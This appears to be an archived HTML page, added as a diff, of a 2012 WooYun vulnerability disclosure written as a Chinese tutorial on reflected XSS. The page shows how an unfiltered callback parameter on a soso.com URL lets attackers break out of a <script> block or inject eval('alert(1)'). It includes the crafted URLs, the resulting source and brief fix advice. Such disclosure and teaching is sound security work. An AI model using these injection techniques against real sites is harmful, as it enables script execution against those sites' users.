@@ -1,0 +1,290 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[腾讯实例教程] 那些年我们一起学XSS - 2. 输出在&lt;script&gt;&lt;/script&gt;之间的情况  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[腾讯实例教程] 那些年我们一起学XSS - 2. 输出在&lt;script&gt;&lt;/script&gt;之间的情况  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的瘦子">心伤的瘦子</a> 
+</li><li>提交时间：		2012-12-13 14:49</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-13：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-13：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-12-23：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-02：	细节向普通白帽子公开<br/>
+									2013-01-12：	细节向实习白帽子公开<br/>
+									2013-01-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">接着上面一个教程，我们继续。这个例子属于第一例的特殊情况，当然也有特殊解法。也属于非常常见的一种情况。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 我们找到这么一个点，也是输入和输出都未过滤的一个点。相比教程第一例，其特殊之处在于，是输出在了 &lt;script&gt;[输出]&lt;/script&gt;之间。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://activity.soso.com/common/setParentsInfo.php?callback=aaaaaaaaa</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+如下图：callback参数未做过滤。 在【查看源代码】下，我们可以看到。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/131415061f74b6727968971f9072a280c21218d1.jpg" target="_blank"><img src="../images/131415061f74b6727968971f9072a280c21218d1.jpg" alt="5.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+缺陷网页源代码:<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;script type=&#039;text/javascript&#039;&gt;document.domain=&#039;soso.com&#039;;_ret={&quot;_res&quot;:2};try{parent.aaa(_ret);}catch(err){aaa(_ret);}&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+2. 碰到这种情况，我们一般有以下解法。<br />
+<br />
+<br />
+<br />
+2.1 首先判断，是否过滤了 &lt; , &gt; , / 等符号，<br />
+<br />
+2.2 如果都没有过滤，恭喜你，一般可以直接XSS了。代码如下：<br />
+<br />
+<br />
+<br />
+http://activity.soso.com/common/setParentsInfo.php?callback=aaaaaaaaa&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br />
+<br />
+<br />
+<br />
+原理入下图：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/13142159aee108c1178a955e6f282cf1452a48ee.jpg" target="_blank"><img src="../images/13142159aee108c1178a955e6f282cf1452a48ee.jpg" alt="6.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+构造callback参数后的源代码<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;script type=&#039;text/javascript&#039;&gt;document.domain=&#039;soso.com&#039;;_ret={&quot;_res&quot;:2};try{parent.aaaaaaaaa&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;(_ret);}catch(err){aaaaaaaaa&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;(_ret);}&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+2.3 如果过滤了 &lt;, &gt;，那么就无法使用上面的办法了。我们接着看 3<br />
+<br />
+<br />
+<br />
+3. script代码里的构造。<br />
+<br />
+<br />
+<br />
+友情提示：这里可能需要一点点 javascript 的知识才行哦～～<br />
+<br />
+<br />
+<br />
+我们可以如下构造：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://activity.soso.com/common/setParentsInfo.php?callback=eval(&#039;alert(1)&#039;);void</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可以看到，源代码是下面的样子。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/13142950184fb686b5ec6d3e5d6aac2711f5929c.jpg" target="_blank"><img src="../images/13142950184fb686b5ec6d3e5d6aac2711f5929c.jpg" alt="7.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+也就是说，我们插入的内容，使得这一段javascript依然【语法正确】，能够【正确执行】，并且能够执行【我们所插入的JS代码】，这样我们的目的就达到了。<br />
+<br />
+<br />
+<br />
+构造后的源代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;script type=&#039;text/javascript&#039;&gt;document.domain=&#039;soso.com&#039;;_ret={&quot;_res&quot;:2};try{parent.eval(&#039;alert(1)&#039;);void(_ret);}catch(err){eval(&#039;alert(1)&#039;);void(_ret);}&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+4. 这种输出在JS代码里的情况十分常见，但是呢？不幸的是，像这样没过滤的情况，却不是很常见。例如：<br />
+<br />
+<br />
+<br />
+var a=&quot;[输出]&quot;; // 通常程序员会把 &quot; 过滤掉， 这样的话，一般来说，我们就很难构造。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+但是，这并不是说，就一定是不能利用，后面我们会拿腾讯一些【比较有意思】的例子，来进一步说到 这个【输出在js里】的情况的～ <br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详情。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">这类XSS的模型通常是：<br />
+<br />
+<br />
+<br />
+&lt;script&gt;...[输出]...&lt;/script&gt;<br />
+<br />
+&lt;style&gt;...[输出]...&lt;/script&gt;<br />
+<br />
+<br />
+<br />
+解决方案：<br />
+<br />
+<br />
+<br />
+1. 过滤 &lt;/xxx&gt; 组合<br />
+<br />
+2. 针对输出在不同的场景，进行合适的过滤。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的瘦子" title="心伤的瘦子">心伤的瘦子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-015959" title="[腾讯实例教程] 那些年我们一起学XSS - 2. 输出在&lt;script&gt;&lt;/script&gt;之间的情况">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2012-12-13 16:03</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="15959";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
